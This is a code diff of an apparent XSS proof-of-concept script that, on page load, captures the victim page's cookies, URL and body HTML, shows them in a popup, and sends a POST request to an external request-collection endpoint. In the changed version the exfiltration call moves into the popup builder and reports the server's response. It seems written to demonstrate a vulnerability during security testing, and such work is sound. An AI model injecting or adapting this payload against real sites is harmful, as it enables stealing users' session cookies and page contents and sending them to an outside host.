@@ -27,20 +27,38 @@ var DocLocation;
 var EmailAddresses;
 var pH = 40;
 var pW = 850;
+
 //The internet POST destination for our exfiltrated data. 
 var Toilet = "https://ptsv2.com/t/qo33d-1598654477";
 
-function ExfiltrateData(ID) {
+function ExfiltrateData(ID,doc)
+{
 	//The popup proves we can obtain the data. 
 	//Now we need to prove we can move it else where.
 	//We can't post anything that would indentify the application we've used this script against. 
 	//ID is the current Timestamp in MS so is a good unique identifer.  	 
 	//POST Request to Toilet 
-	const xhr = new XMLHttpRequest();
-	xhr.open("POST", Toilet + "/post", true);
-	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	xhr.send("XSS-TEST-" + ID);
+	 var xhr = new XMLHttpRequest();
+	 xhr.onreadystatechange = function() {
+			if (xhr.readyState == XMLHttpRequest.DONE) {
+				//Get Response
+				var element = doc.document.getElementById("ExfiltrationLink");
+				 if (xhr.status === 200) {				
+					
+						element.innerHTML = element.innerHTML += "\t("+xhr.responseText+")";
+				 }
+				else
+				{
+					element.innerHTML = element.innerHTML += "\t("+xhr.responseText+")";
+				}	
+			}
+		}
+	
+	 xhr.open('POST', Toilet+"/post", true);
+	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	 xhr.send("XSS-TEST-"+ID);		 
 }
+
 //Resize Popup
 function resize_now(doc, addHeight, addWidth) {
 	if (pH < 1024) {
@@ -69,6 +87,7 @@ function BuildContainer(doc, titletext, datatext, dataheight, hyperlink) {
 			var HyperLink = doc.document.createElement("a");
 			HyperLink.setAttribute("class", "BTN");
 			HyperLink.innerHTML = datatext;
+			HyperLink.setAttribute("id", "ExfiltrationLink");
 			HyperLink.href = Toilet;
 			HyperLink.target = "_blank"
 			container.appendChild(HyperLink);
@@ -130,6 +149,7 @@ function createPopup() {
 	popup.document.head.appendChild(style);
 	popup.document.title = "XSS Data Exfiltration";
 	//END Header
+	ExfiltrateData(TimeAsMS,popup);
 	BuildContainer(popup, "Exfiltration ID", TimeAsMS, 20, 1);
 	BuildContainer(popup, "Document Location", DocLocation, 20, 0);
 	BuildContainer(popup, "Document Cookie", UsersCookie, 100, 0);
@@ -149,6 +169,5 @@ window.addEventListener('load', function () {
 	UsersCookie = document.cookie;
 	DocHTML = document.getElementsByTagName('body')[0].innerHTML;
 	DocLocation = document.location.href;
-	ExfiltrateData(TimeAsMS);
 	createPopup();
 })
